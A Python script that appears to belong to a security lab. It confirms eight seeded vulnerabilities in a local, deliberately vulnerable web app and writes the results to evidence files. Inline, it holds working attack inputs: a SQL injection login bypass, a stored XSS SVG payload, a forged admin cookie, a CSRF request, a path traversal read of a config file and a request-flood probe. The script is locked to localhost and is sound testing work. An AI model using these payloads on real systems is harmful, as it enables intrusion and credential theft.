#!/usr/bin/env python3
"""Verify eight actual baseline failures; collect localhost-only evidence.

Mutates Alice's fictional email and adds a harmless stored XSS proof comment.
40 requests / 4 workers is a capacity probe, not a claim of successful DoS.
"""
import argparse
import concurrent.futures
import datetime
import html
import http.client
import json
import statistics
import time
from collections import Counter
from pathlib import Path
from urllib.parse import urlencode, urlsplit

ROOT = Path(__file__).resolve().parents[1]
PAYLOAD = '<svg onload="this.outerHTML=\'<p>XSS executed</p>\'"></svg>'


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--url", default="http://127.0.0.1:8080")
    args = parser.parse_args()
    target = urlsplit(args.url)
    if target.scheme != "http" or target.hostname not in {"127.0.0.1", "localhost", "::1"} or target.path not in {"", "/"} or target.username or target.query or target.fragment:
        parser.error("Only a local HTTP lab origin is supported")
    now = datetime.datetime.now(datetime.timezone.utc)
    dest = ROOT / "output" / "evidence" / ("baseline-" + now.strftime("%Y%m%dT%H%M%S%fZ"))
    dest.mkdir(parents=True)
    records = []
    findings = []

    def request(path, method="GET", data=None, cookie=None, origin=None, capture=True):
        headers = {}
        body = urlencode(data) if data is not None else None
        if body is not None:
            headers["Content-Type"] = "application/x-www-form-urlencoded"
        if cookie:
            headers["Cookie"] = cookie
        if origin:
            headers["Origin"] = origin
        start = time.perf_counter()
        con = http.client.HTTPConnection(target.hostname, target.port or 80, timeout=5)
        try:
            con.request(method, path, body, headers)
            response = con.getresponse()
            text = response.read().decode("utf-8", errors="replace")
            result = {"method": method, "path": path, "request_body": body,
                      "request_headers": headers, "status": response.status,
                      "response_headers": dict(response.getheaders()), "body": text,
                      "latency_ms": round((time.perf_counter() - start) * 1000, 2)}
        except Exception as error:
            result = {"method": method, "path": path, "status": 0, "error": str(error),
                      "latency_ms": round((time.perf_counter() - start) * 1000, 2)}
        finally:
            con.close()
        if capture:
            records.append(result)
        return result

    def finding(ident, title, observed, detail):
        findings.append({"id": ident, "title": title, "baseline_failure_observed": bool(observed), "detail": detail})
        print(f"{ident} {'OBSERVED' if observed else 'NOT OBSERVED'}  {title}")

    for _ in range(30):
        ready = request("/health", capture=False)
        if ready["status"] == 200:
            break
        time.sleep(0.25)
    else:
        raise SystemExit("Lab is not ready. Start the stack and inspect docker compose logs.")
    normal = request("/login", "POST", {"username": "alice", "password": "alice123"})
    assert normal["status"] == 303 and normal["response_headers"].get("Set-Cookie", "").startswith("user_id=2"), "Alice sign-in failed; use a fresh baseline"
    alice = "user_id=2"
    injected = request("/login", "POST", {"username": "' OR 1=1 -- ", "password": "wrong"})
    finding("V01", "SQL injection", injected["status"] == 303 and injected["response_headers"].get("Set-Cookie", "").startswith("user_id=1"), "Injected sign-in selects the admin account without its password.")
    posted = request("/comment", "POST", {"ticket_id": "1001", "body": PAYLOAD}, alice)
    ticket = request("/ticket?id=1001", cookie=alice)
    finding("V02", "Stored XSS", posted["status"] == 303 and PAYLOAD in ticket.get("body", ""), "Harmless SVG payload stored and returned as raw markup. Browser execution requires separate visual verification.")
    private = request("/ticket?id=1002", cookie=alice)
    finding("V03", "Broken access control (IDOR)", private["status"] == 200 and "Bob's payroll" in html.unescape(private.get("body", "")), "Alice can read Bob's confidential fictional ticket by changing its ID.")
    denied = request("/admin", cookie=alice)
    forged = request("/admin", cookie="user_id=1")
    finding("V04", "Weak authentication / forged session", denied["status"] == 403 and forged["status"] == 200, "Alice is denied; an unsigned identity cookie grants administrator access without credentials.")
    csrf = request("/account/email", "POST", {"email": "alice.updated@example.test"}, alice, "http://127.0.0.1:8091")
    account = request("/account", cookie=alice)
    finding("V05", "CSRF", csrf["status"] == 303 and "alice.updated@example.test" in account.get("body", ""), "Cross-origin POST with the session cookie updates email without a token. Browser cookie behaviour must be verified separately.")
    traversal = request("/download?" + urlencode({"file": "../private/legacy-config.txt"}))
    finding("V06", "Path traversal", traversal["status"] == 200 and "DB_PASSWORD=legacy-db-password" in traversal.get("body", ""), "Download escapes its public directory into a private dummy fixture.")
    debug = request("/debug")
    headers = {key.lower() for key in debug.get("response_headers", {})}
    missing = sorted({"content-security-policy", "x-frame-options", "x-content-type-options"} - headers)
    finding("V07", "Security misconfiguration", debug["status"] == 200 and '"password": "admin"' in debug.get("body", "") and len(missing) == 3, "Public debug leaks fictional plaintext passwords; missing headers: " + ", ".join(missing))
    started = time.perf_counter()
    with concurrent.futures.ThreadPoolExecutor(max_workers=4) as pool:
        samples = list(pool.map(lambda _: request("/reports/export", cookie=alice, capture=False), range(40)))
    elapsed = time.perf_counter() - started
    codes = dict(Counter(str(x["status"]) for x in samples))
    latency = sorted(x["latency_ms"] for x in samples)
    load = {"requests": 40, "concurrency": 4, "elapsed_seconds": round(elapsed, 3), "throughput_rps": round(40 / elapsed, 2),
            "status_counts": codes, "median_latency_ms": round(statistics.median(latency), 2),
            "p95_latency_ms": latency[max(0, int(len(latency) * .95) - 1)],
            "limitation": "Bounded local probe demonstrates missing admission controls; does not establish DoS, DDoS resistance or system resource consumption."}
    records.extend(samples)
    finding("V08", "Unrestricted expensive requests", codes.get("200", 0) == 40 and "429" not in codes, "All 40 expensive authenticated requests accepted using four workers; no rate-limit response.")
    result = {"recorded_at_utc": now.isoformat(), "stage": "vulnerable", "target": args.url, "findings": findings, "load_probe": load}
    (dest / "results.json").write_text(json.dumps(result, indent=2))
    (dest / "http-captures.json").write_text(json.dumps(records, indent=2))
    md = ["# Vulnerable baseline evidence", "", f"Captured: {now.isoformat()}", f"Target: {args.url}", "", "| Finding | Failure observed | Evidence |", "|---|---|---|"]
    md += [f"| {f['id']} {f['title']} | {'Yes' if f['baseline_failure_observed'] else 'No'} | {f['detail']} |" for f in findings]
    md += ["", "## Bounded load probe", "", "```json", json.dumps(load, indent=2), "```", "", "These are baseline measurements, not post-hardening results. Stored XSS execution and browser CSRF are verified separately in screenshots/browser notes. Resource metrics have not been collected by this script."]
    (dest / "summary.md").write_text("\n".join(md) + "\n")
    print(f"Evidence: {dest}")
    if not all(f["baseline_failure_observed"] for f in findings):
        raise SystemExit(1)


if __name__ == "__main__":
    main()
